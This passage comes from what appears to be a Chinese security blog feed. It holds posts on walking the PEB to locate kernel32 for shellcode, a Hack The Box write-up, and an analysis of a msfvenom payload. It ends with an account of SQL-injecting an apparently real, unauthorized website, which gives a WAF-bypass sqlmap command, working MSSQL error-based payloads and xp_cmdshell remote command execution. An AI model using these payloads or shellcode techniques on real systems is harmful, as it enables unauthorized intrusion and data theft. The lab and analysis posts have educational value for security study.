CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb40   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x1e699fab - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b36d8 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b36d8 Void   +0x050 DdagNode         : 0x004b36d8 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : (null)    +0x060 ParentDllBase    : 0x004b3f28 Void   +0x064 SwitchBackContext : (null)    +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0xf46857d4   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0x800   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3b08 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3ec8 - 0x4b3620 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3d40 - 0x4b3ed0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]   +0x018 DllBase          : 0x000e0000 Void   +0x01c EntryPoint       : 0x00420040 Void   +0x020 SizeOfImage      : 0x4b3c08   +0x024 FullDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;0???&quot;   +0x034 Flags            : 0x7750db30   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y1   +0x034 InLegacyLists    : 0y0   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb30   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x59b71f87 - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b3bc0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b3bc0 Void   +0x050 DdagNode         : 0x004b3bc0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : 0x773f1194 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : 0x004b3788 Void   +0x064 SwitchBackContext : 0x004b3680 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`536cd652   +0x090 BaseNameHashValue : 0x4000   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>对面上面的汇编</p><pre><code class="asm">mov eax,[fs:0x30] ;EAX=PEBmov eax,[eax+0xc] ;EAX=PEB-&gt;Ldrmov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)mov ebx,[eax+0x10] ;EBX=Kernel32基地址</code></pre><p>最后对应的0x10链表首地址放的即为kernel32.dll的基址</p><pre><code> +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]</code></pre><p>其实可以简写成别的(lodsd看起来容易把人搞混）</p><pre><code class="asm">mov eax, fs:[0x30]   //得到PEB地址，其实这里还有个TEB的概念，但是只用到这一次，为了防止混乱，就不再解释了mov eax, [eax + 0xc]//指向PEB_LDR_DATA结构的首地址mov eax, [eax + 0x1c]//一个双向链表的地址mov eax, [eax]//得到第二个条目kernelBase的链表mov eax, [eax]//得到第三个条目kernel32链表（win10）mov eax, [eax + 0x8] //kernel32.dll地址</code></pre><p>对应0x8链表里的kernel32.dll基址<br><img src="https://s3.ax1x.com/2021/02/22/yHtCWQ.png" alt=""></p><p><strong>在内存里的过程</strong><br>可以使用OD进行验证，od拖入test.exe。然后在堆栈窗口ctrl+G输入<code>fs:[0]</code>跳到所在位置<br>执行<code>mov eax,fs[0x30]</code>后<br><img src="https://s3.ax1x.com/2021/02/22/yHN04U.png" alt=""></p><p>执行<code>mov eax, [eax + 0xc]</code>得到LDR地址<br>(得到PEB地址后，在内存窗口ctrl+G输入PEB的地址，选择”长型”-&gt;”地址”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD3dA.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHwYGT.png" alt=""></p><p>执行<code>lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址</code>得到链表里的第一个Flink的地址<br>(数据窗口选择刚刚的InMemoryOrderModuleList地址，选择”数据窗口跟随”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD5w9.png" alt=""></p><p>继续执行</p><pre><code>xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHr9Yt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHrZwj.png" alt=""></p><p>如何用C实现？<br>1.直接用汇编返回对PEB地址然后根据微软给的数据结构解析即可<br>2.直接用给出的数据结构来解析 （好像可以这么写）</p><p>第一种方法</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main(){    DWORD PPEB;    DWORD LLDR;    DWORD dllbase;    DWORD initlist;    DWORD virtualaddress;    PCHAR dllname;    char *kernel32dllname = &quot;KERNEL32.dll&quot;;    PIMAGE_DOS_HEADER dosheader;    PIMAGE_NT_HEADERS ntheader;    PIMAGE_EXPORT_DIRECTORY exportdirectory;    __asm {        mov eax, fs:[0x30];EAX = PEB        mov PPEB,eax    }    LLDR = *(PDWORD)(PPEB + 0xc); //LDR    printf(&quot;PEB Address:0x%x\n&quot;, PPEB);    initlist=*(PDWORD)(LLDR+0x1c); //LDR-&gt;InInitializationOrderModuleList    CHAR szGetProcAddr[]=&quot;GetProcAddress&quot;;    CHAR szLoadLib[]=&quot;LoadLibraryA&quot;;    for (;dllbase = *(PDWORD)(initlist + 0x8);initlist = *(PDWORD)initlist) { //遍历InMemoryOrderLinks链表        dosheader = (PIMAGE_DOS_HEADER)dllbase; //DOS头部        ntheader = (PIMAGE_NT_HEADERS)(dllbase+dosheader-&gt;e_lfanew); //PE头部        virtualaddress = ntheader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress; //EXPORT_DIRECTORY        exportdirectory = (PIMAGE_EXPORT_DIRECTORY)(dllbase + virtualaddress); //导出表        dllname = (PCHAR)(dllbase + exportdirectory-&gt;Name); //DLL Name        if (!strcmp(dllname, kernel32dllname)) {            printf(&quot;%s Address:0x%x\n&quot;, kernel32dllname, dllbase);        }    }    system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHrsne.png" alt=""></p><p>之后就是从kernel32.dll的PE里导出loadlibraryA和GetProcAddress函数的地址。<br>（下次在写）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jb51.net/article/171962.htm" target="_blank" rel="noopener">https://www.jb51.net/article/171962.htm</a><br><a href="https://zhuanlan.zhihu.com/p/109079902" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/109079902</a><br><a href="https://www.cnblogs.com/lsgxeva/p/10794735.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsgxeva/p/10794735.html</a><br><a href="https://xz.aliyun.com/t/2108" target="_blank" rel="noopener">https://xz.aliyun.com/t/2108</a><br><a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。&lt;/p&gt;
&lt;h2 id=&quot;P</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hack the box Academy</title>
    <link href="http://422926799.github.io/posts/ae09ddc5.html"/>
    <id>http://422926799.github.io/posts/ae09ddc5.html</id>
    <published>2021-02-19T17:10:30.000Z</published>
    <updated>2021-02-19T17:41:55.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没事干和队友打htb</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p><pre><code>portscan:22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>whatweb获取web信息的时候发现跳转到<code>http://academy.htb/</code>的域失败了，/etc/hosts加了上去</p><pre><code>http://academy.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], Title[Hack The Box Academy]</code></pre><p>常规的路径扫描<br><img src="https://s3.ax1x.com/2021/02/20/y4N0nU.png" alt=""></p><h2 id="入口点立足"><a href="#入口点立足" class="headerlink" title="入口点立足"></a>入口点立足</h2><p>打开web发现可以注册和登录，注册可以注册admin用户<br><img src="https://s3.ax1x.com/2021/02/20/y4NBBF.png" alt=""></p><p>到后台登录队友说是弱口令登录，but我就是tm不行。后面找其要来cookie登上，发现提示<code>dev-staging-01.academy.htb</code>,添加到hosts<br>访问发现是laravel<br><img src="https://s3.ax1x.com/2021/02/20/y4NsAJ.png" alt=""></p><p>由于开启了debug，得到API_KEY<br><img src="https://s3.ax1x.com/2021/02/20/y4N21x.png" alt=""></p><p>搜索laravel RCE发现一个CVE-2018-15133<br>exp：<a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133" target="_blank" rel="noopener">https://github.com/aljavier/exploit_laravel_cve-2018-15133</a><br>利用该CVE获得shell<br><img src="https://s3.ax1x.com/2021/02/20/y4N5He.png" alt=""></p><h2 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h2><p><code>ls -al /home/*</code>确定要攻击的目标用户<br>（带有user.txt的才是最终用户）<br><img src="https://s3.ax1x.com/2021/02/20/y4USEQ.png" alt=""></p><p>在web目录瞎翻，翻到两个数据库凭证<br><img src="https://s3.ax1x.com/2021/02/20/y4NoAH.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/20/y4Nju8.png" alt=""></p><p>手机/home/目录下的用户，使用hydra爆破得到用户<br><img src="https://s3.ax1x.com/2021/02/20/y4UPCn.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿完user.txt后，经过一个小时后使用linPEAss脚本进行信息收集，发现有个su的用户提权的密码<br><img src="https://s3.ax1x.com/2021/02/20/y4Ui3q.png" alt=""></p><p>登录后尝试sudo -l发现拥有sudo权限<br><img src="https://s3.ax1x.com/2021/02/20/y4UEuT.png" alt=""></p><p>GTFObins搜索到对应的提权方法<br><a href="https://gtfobins.github.io/gtfobins/composer/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/composer/</a></p><p>提权成功<br><img src="https://s3.ax1x.com/2021/02/20/y4UZbF.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;没事干和队友打htb&lt;/p&gt;
&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom生成的windows/exec shellcode分析</title>
    <link href="http://422926799.github.io/posts/c86ff70d.html"/>
    <id>http://422926799.github.io/posts/c86ff70d.html</id>
    <published>2021-02-19T04:40:56.000Z</published>
    <updated>2021-02-19T08:46:52.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于之前就想分析msfvenom生成的payload。经过前后几次波折<br>第三次分析后才看懂了不少。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>1.msfvenom生成shellcode<br>ps:用x86更好的分析</p><pre><code>msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin</code></pre><p>2.将shellcode放入一个PE里<br>准备工具:</p><ul><li>yasm.exe</li><li>GoLink.exe<br><img src="https://s3.ax1x.com/2021/02/19/yfWvJf.png" alt=""></li></ul><p>将shellcdoe.bin和shellcode.asm放在同一个目录<br>shellcode.asm</p><pre><code class="asm">Global StartSECTION &#39;foo&#39; write,execute,readStart:incbin &quot;shellcode.bin&quot;</code></pre><p>生成obj后在生成exe</p><pre><code>yasm.win32.exe -f win32 -o shell.obj shellcode.asmGolink /ni /entry Start shell.obj</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yffFwn.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yffkoq.png" alt=""></p><p>3.利用IDA分析<br><img src="https://s3.ax1x.com/2021/02/19/yffZWT.png" alt=""></p><p>loc_401088函数分析</p><p>msf生成payload的模板对照分析<br><img src="https://s3.ax1x.com/2021/02/19/yff8Fx.png" alt=""><br>提一点:msf生成的shellcode模板对应的API是<code>hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )</code><br>计算公式：</p><pre><code class="text">msf的windows API方法：DLL HASH+API HASH=HASH如果知道最终hash求对应的API名称，计算公式：HASH-DLL HASH=API HASH例如：kernel32.dll HASH-&gt;92AF16DAWinexec HASH-&gt;F4C07457x86截取最后8位最终hash位：92AF16DA+F4C07457=876F8B31得到hash反求API hash：876F8B31-92AF16DA=F4C07457对应API和DLL 的HASH参考:https://github.com/hidd3ncod3s/WindowsAPIhash</code></pre><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a></p><pre><code class="ruby">  def self.win32_rwx_exec_thread(code, block_offset, which_offset=&#39;start&#39;)    stub_block = Rex::Payloads::Shuffle.from_graphml_file(      File.join(Msf::Config.install_root, &#39;data&#39;, &#39;shellcode&#39;, &#39;block_api.x86.graphml&#39;),      arch: ARCH_X86,      name: &#39;api_call&#39;    )    stub_exit = %Q^    ; Input: EBP must be the address of &#39;api_call&#39;.    ; Output: None.    ; Clobbers: EAX, EBX, (ESP will also be modified)    ; Note: Execution is not expected to (successfully) continue past this block    exitfunk:      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...      push 0x9DBD95A6        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7      jl goodbye       ; Then just call the exit function...      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...      jne goodbye      ;      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread    goodbye:                 ; We now perform the actual call to the exit function      push byte 0            ; push the exit function parameter      push ebx               ; push the hash of the exit function      call ebp               ; call EXITFUNK( 0 );    ^    stub_alloc = %Q^      pushad                 ; Save registers      cld                    ; Clear the direction flag.      call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.    delta:                   ;    #{stub_block}    start:                   ;      pop ebp                ; Pop off the address of &#39;api_call&#39; for calling later.    allocate_size:       mov esi,#{code.length}    allocate:      push byte 0x40         ; PAGE_EXECUTE_READWRITE      push 0x1000            ; MEM_COMMIT      push esi               ; Push the length value of the wrapped code block      push byte 0            ; NULL as we dont care where the allocation is.      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );      mov ebx, eax           ; Store allocated address in ebx      mov edi, eax           ; Prepare EDI with the new address      mov ecx, esi           ; Prepare ECX with the length of the code      call get_payload    got_payload:      pop esi                ; Prepare ESI with the source to copy      rep movsb              ; Copy the payload to RWX memory      call set_handler       ; Configure error handling    exitblock:    #{stub_exit}    set_handler:      xor eax,eax;     push dword [fs:eax];     mov dword [fs:eax], esp      push eax               ; LPDWORD lpThreadId (NULL)      push eax               ; DWORD dwCreationFlags (0)      push eax               ; LPVOID lpParameter (NULL)      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)      push eax               ; SIZE_T dwStackSize (0 for default)      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)      push 0x160D6838        ; hash( &quot;kernel32.dll&quot;, &quot;CreateThread&quot; )      call ebp               ; Spawn payload thread      pop eax                ; Skip;     pop eax                ; Skip      pop eax                ; Skip      popad                  ; Get our registers back;     sub esp, 44            ; Move stack pointer back past the handler    ^    stub_final = %Q^    get_payload:      call got_payload    payload:    ; Append an arbitrary payload here    ^    stub_alloc.gsub!(&#39;short&#39;, &#39;&#39;)    stub_alloc.gsub!(&#39;byte&#39;, &#39;&#39;)    wrapper = &quot;&quot;    # regs    = %W{eax ebx ecx edx esi edi ebp}    cnt_jmp = 0    cnt_nop = 64    stub_alloc.each_line do |line|      line.gsub!(/;.*/, &#39;&#39;)      line.strip!      next if line.empty?      if cnt_nop &gt; 0 &amp;&amp; rand(4) == 0        wrapper &lt;&lt; &quot;nop\n&quot;        cnt_nop -= 1      end      if cnt_nop &gt; 0 &amp;&amp; rand(16) == 0        cnt_nop -= 2        cnt_jmp += 1        wrapper &lt;&lt; &quot;jmp autojump#{cnt_jmp}\n&quot;        1.upto(rand(8)+1) do          wrapper &lt;&lt; &quot;db 0x#{&quot;%.2x&quot; % rand(0x100)}\n&quot;          cnt_nop -= 1        end        wrapper &lt;&lt; &quot;autojump#{cnt_jmp}:\n&quot;      end      wrapper &lt;&lt; line + &quot;\n&quot;    end</code></pre><p>start函数对应分析<br><img src="https://s3.ax1x.com/2021/02/19/yffqcF.png" alt=""></p><p>由于静态call ebp这种找不到对应的地址，通过od来跟踪到loc_401088函数里的<code>call ebp</code><br>1.首先栈顶最上放出栈到ebp<br>2.然后push 1<br>3.在从堆栈里把calc.exe赋予到eax -&gt; lea eax,[ebp+0B2h]<br><img src="https://s3.ax1x.com/2021/02/19/yfhX28.png" alt=""><br>4.push eax，将calc.exe写入到堆栈<br>5.push Winexec对应的函数<br>6.然后call栈顶<br><img src="https://s3.ax1x.com/2021/02/19/yfhYEn.png" alt=""></p><p>地址跳转到00401006地址<br><img src="https://s3.ax1x.com/2021/02/19/yfI5KU.png" alt=""></p><p>PEB-&gt;Ldr-&gt;</p><pre><code> mov     edx, fs:[eax+30h] ; 寻找PEB地址foo:0040100F                 mov     edx, [edx+0Ch]  ; PEB_LDR_DATAfoo:00401012                 mov     edx, [edx+14h]  ; ModuleEntryPointfoo:00401015foo:00401015 loc_401015:                             ; CODE XREF: start+86↓jfoo:00401015                 mov     esi, [edx+28h]  ; 遍历获取某些值的区段foo:00401018                 movzx   ecx, word ptr [edx+26h] xor     edi, edi        ; 清空EDI寄存器 lodsb                   ; 将SI的存储值赋予ALfoo:0040101E                                         ; mov eax,[esi]foo:0040101E                                         ; df=1;SI+1 else SI-1</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yf78DU.png" alt=""></p><p>寻找对应API的函数</p><pre><code>0040101E   &gt; /AC            lods byte ptr ds:[esi]0040101F   . |3C 61         cmp al,0x6100401021   . |7C 02         jl short shell.0040102500401023   . |2C 20         sub al,0x2000401025   &gt; |C1CF 0D       ror edi,0xD00401028   . |01C7          add edi,eax0040102A   .^\E2 F2         loopd short shell.0040101E0040102C   .  52            push edx0040102D   .  57            push edi0040102E   .  8B52 10       mov edx,dword ptr ds:[edx+0x10]          ;  shell.0040000000401031   .  8B4A 3C       mov ecx,dword ptr ds:[edx+0x3C]00401034   .  8B4C11 78     mov ecx,dword ptr ds:[ecx+edx+0x78]00401038   .  E3 48         jecxz short shell.004010820040103A   .  01D1          add ecx,edx0040103C   .  51            push ecx0040103D   .  8B59 20       mov ebx,dword ptr ds:[ecx+0x20]00401040   .  01D3          add ebx,edx00401042   .  8B49 18       mov ecx,dword ptr ds:[ecx+0x18]00401045   &gt;  E3 3A         jecxz short shell.0040108100401047   .  49            dec ecx00401048   .  8B348B        mov esi,dword ptr ds:[ebx+ecx*4]0040104B   .  01D6          add esi,edx0040104D   .  31FF          xor edi,edi0040104F   &gt;  AC            lods byte ptr ds:[esi]00401050   .  C1CF 0D       ror edi,0xD00401053   .  01C7          add edi,eax00401055   .  38E0          cmp al,ah00401057   .^ 75 F6         jnz short shell.0040104F00401059   .  037D F8       add edi,dword ptr ss:[ebp-0x8]0040105C   .  3B7D 24       cmp edi,dword ptr ss:[ebp+0x24]0040105F   .^ 75 E4         jnz short shell.00401045</code></pre><p>最后得到的API函数地址赋于eax</p><pre><code>00401075   .  894424 24     mov dword ptr ss:[esp+0x24],eax          ;  kernel32.WinExec</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yfbU6x.png" alt=""></p><p>最后jmp eax对应的地址执行<br><img src="https://s3.ax1x.com/2021/02/19/yfbIAg.png" alt=""></p><p>执行完WinExec函数后，执行GetVersion判断退出操作<br><img src="https://s3.ax1x.com/2021/02/19/yhnum6.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhnY6I.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhna0f.png" alt=""></p><p>简写成一个过程：<br>PEB-&gt;ModuleEntryPoint-&gt;找到Kernel32.dll-&gt;WinExec-&gt;lea eax-&gt;call-&gt;Exit</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a><br><a href="https://www.anquanke.com/post/id/85386" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85386</a><br><a href="http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html" target="_blank" rel="noopener">http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html</a><br><a href="https://my.oschina.net/u/4593082/blog/4418768" target="_blank" rel="noopener">https://my.oschina.net/u/4593082/blog/4418768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于之前就想分析msfvenom生成的payload。经过前后几次波折&lt;br&gt;第三次分析后才看懂了不少。&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>一次糟糕的mssql注入尝试</title>
    <link href="http://422926799.github.io/posts/976028d5.html"/>
    <id>http://422926799.github.io/posts/976028d5.html</id>
    <published>2021-02-13T13:51:15.000Z</published>
    <updated>2021-02-13T15:10:47.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="观前提醒"><a href="#观前提醒" class="headerlink" title="观前提醒"></a>观前提醒</h2><p>本文已对实际的人以游戏或番剧人名代替</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>源于昨天一次组团冲塔的时候发现的一个站。原本随便看一下，没注入就换目标。结果呢<br>随手一测还真有个注入。然后开始漫长的摸索…</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一个熟悉的登录框<br><img src="https://s3.ax1x.com/2021/02/13/ysQszT.png" alt=""></p><p>哎，反手一个引号。<code>sql server Error</code><br><img src="https://s3.ax1x.com/2021/02/13/ysQReJ.png" alt=""></p><p>sqlmap扔进去？没跑出来，经过测试，得到sqlmap command绕过 WAF （空气waf就像3090一样根本不存在）</p><pre><code>sudo proxychains sqlmap -r post.txt --tamper=space2randomblank.py,equaltolike.py -v 3</code></pre><p>盲注，慢的一批<br><img src="https://s3.ax1x.com/2021/02/13/ysQbOe.png" alt=""></p><p>就在逐个跑表的时候，一名A哥已经手注了。这时我赶紧白嫖了A哥的payload</p><pre><code>id=1&#39; and 1&lt;(select @@version) --&amp;password=11111</code></pre><p>报错注入bingo<br><img src="https://s3.ax1x.com/2021/02/13/yslulT.png" alt=""></p><p>获取所有表名或子段名/某指定表名</p><pre><code>id=admin&#39; and 1&lt;(select QUOTENAME(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;wwwlog&#39;  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(UNAME) from master dbo.wwwlog FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd</code></pre><p>后发现sqlmap跑出来的数据和查出来的差一大截，索性不用sqlmap<br><img src="https://s3.ax1x.com/2021/02/13/yslq3V.png" alt=""></p><p>后面测试多段注入使用cmd_shell尝试能否使用的时候，发现并未成功（后面发现的原因是master..xp_cmdshell不行，直接xp_cmdshell就可以？？？？）<br><img src="https://s3.ax1x.com/2021/02/13/ys1zM8.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>思考半天后不知如何实现回显RCE，后搜到一篇文章如醍醐灌顶。<br>创建表，把执行结果插入到表里然后读取即可</p><pre><code>id=admin&#39; CREATE TABLE tmpx (tmp1 varchar(max),tmp2 varchar(max))--&amp;password=11id=admin&#39; insert into tmpx (tmp1) exec xp_cmdshell &#39;whoami&#39;--&amp;password=11id=admin&#39; and 1&lt;(select QUOTENAME(tmp1) from tmpx FOR XML PATH(&#39;&#39;)) --&amp;password=11id=admin&#39; drop table tmpx --&amp;password=11</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>为了方便执行命令，写了个py<br><img src="https://s3.ax1x.com/2021/02/13/ysG8KK.png" 